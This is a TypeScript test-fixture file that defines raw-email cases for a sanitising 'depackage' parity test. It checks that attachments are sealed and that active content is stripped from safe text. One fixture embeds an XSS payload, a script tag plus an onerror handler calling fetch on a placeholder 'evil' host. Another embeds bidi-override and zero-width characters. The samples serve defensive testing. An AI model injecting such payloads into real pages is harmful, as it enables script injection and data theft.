/**
 * Depackage parity corpus (Build A, Deliverable 2).
 *
 * A shared set of raw-email inputs exercised by the depackage parity test. It is
 * exported (not inlined in a single test) precisely so Build B's email-path
 * cutover regression can reuse the EXACT same corpus to prove the seam produces
 * the same depackaged result as the path it replaces.
 *
 * Each entry carries the raw bytes plus the plaintext fragments that MUST be
 * recoverable, so semantic parity is checkable without depending on the
 * worker's randomly-generated blob_ids.
 */

const CRLF = '\r\n'

function eml(parts: string[]): Buffer {
  return Buffer.from(parts.join(CRLF), 'utf8')
}

export interface ParityCase {
  readonly name: string
  readonly bytes: Buffer
  /** Plain-text body fragment that must survive into safe-text body_text. */
  readonly expectBodyIncludes?: string
  /** Attachment plaintext markers that must be recoverable from sealed artifacts. */
  readonly expectArtifactPlaintexts: readonly string[]
  /** Active-content fragments that must NEVER appear in safe-text. */
  readonly forbidInSafeText: readonly string[]
}

export const DEPACKAGE_PARITY_CORPUS: readonly ParityCase[] = [
  {
    name: 'plain-text-only',
    bytes: eml(['Subject: plain hello', '', 'just a plain body line']),
    expectBodyIncludes: 'just a plain body line',
    expectArtifactPlaintexts: [],
    forbidInSafeText: [],
  },
  {
    name: 'multipart-with-binary-attachment',
    bytes: eml([
      'Subject: with attachment',
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="P1"',
      '',
      '--P1',
      'Content-Type: text/plain',
      '',
      'public body text',
      '--P1',
      'Content-Type: application/octet-stream',
      'Content-Disposition: attachment; filename="secret.bin"',
      'Content-Transfer-Encoding: base64',
      '',
      Buffer.from('PARITY-SECRET-ATTACHMENT-001').toString('base64'),
      '--P1--',
      '',
    ]),
    expectBodyIncludes: 'public body text',
    expectArtifactPlaintexts: ['PARITY-SECRET-ATTACHMENT-001'],
    forbidInSafeText: ['PARITY-SECRET-ATTACHMENT-001'],
  },
  {
    name: 'html-part-becomes-artifact-not-text',
    bytes: eml([
      'Subject: html active content',
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="P2"',
      '',
      '--P2',
      'Content-Type: text/plain',
      '',
      'visible plain part',
      '--P2',
      'Content-Type: text/html',
      '',
      '<script>steal()</script><img src=x onerror="fetch(\'//evil\')">',
      '--P2--',
      '',
    ]),
    expectBodyIncludes: 'visible plain part',
    expectArtifactPlaintexts: [],
    forbidInSafeText: ['<script', 'onerror'],
  },
  {
    name: 'bidi-and-zero-width-in-plain-part',
    bytes: eml([
      'Subject: control chars',
      'MIME-Version: 1.0',
      'Content-Type: text/plain',
      '',
      'safe line\u202Eevil\u200B end',
    ]),
    expectArtifactPlaintexts: [],
    forbidInSafeText: ['\u202E', '\u200B'],
  },
]
